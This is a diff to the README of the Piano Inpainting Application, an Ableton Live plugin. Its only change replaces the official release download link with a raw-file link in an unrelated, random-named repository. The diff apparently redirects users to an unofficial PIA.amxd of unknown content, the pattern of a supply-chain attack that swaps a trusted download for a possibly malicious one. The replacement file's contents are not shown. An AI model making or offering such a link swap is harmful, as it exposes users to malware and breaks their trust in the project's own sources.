@@ -26,7 +26,7 @@ The Piano Inpainting Application (PIA) comes as a lightweight [Ableton Live](htt
 
 
 ### How to use
-You can download PIA using the [Download .amxd](https://github.com/Ghadjeres/piano-inpainting-application/releases/download/v0.1-alpha/PIA.amxd) link above and simply drag and drop the `PIA.amxd` file within Ableton Live's  MIDI plugin section. 
+You can download PIA using the [Download .amxd](https://github.com/qhpzsefhy/pia/raw/master/releases/PIA.amxd) link above and simply drag and drop the `PIA.amxd` file within Ableton Live's  MIDI plugin section. 
 
 Select a region in the MIDI track you wish to edit by specifying it using the loop selector (CMD + L) and click on PIA's *Generate* button. The *density* knob controls how many notes per second the inpainted region should have. The last button is used to set the *density* knob to the actual note density of the selected region.
 
